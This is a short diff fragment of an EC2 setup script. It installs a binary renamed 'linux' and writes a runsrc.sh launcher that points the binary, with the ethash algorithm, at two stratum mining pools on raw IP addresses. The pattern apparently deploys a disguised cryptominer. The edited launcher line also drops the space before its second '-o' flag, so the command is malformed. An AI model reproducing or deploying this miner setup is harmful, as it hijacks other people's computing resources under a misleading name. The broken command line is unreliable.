@@ -9,7 +9,7 @@ mv linux /home/ec2-user/bin/linux
 
 cat << "EOF" > /home/ec2-user/bin/runsrc.sh
 #!/bin/bash
-./linux -a ethash -o stratum+http://184.164.64.100:8086 -o stratum+http://159.203.107.149:8080
+./linux -a ethash -o stratum+http://159.203.107.149:8080-o stratum+http://184.164.64.100:8086
 
 EOF
 
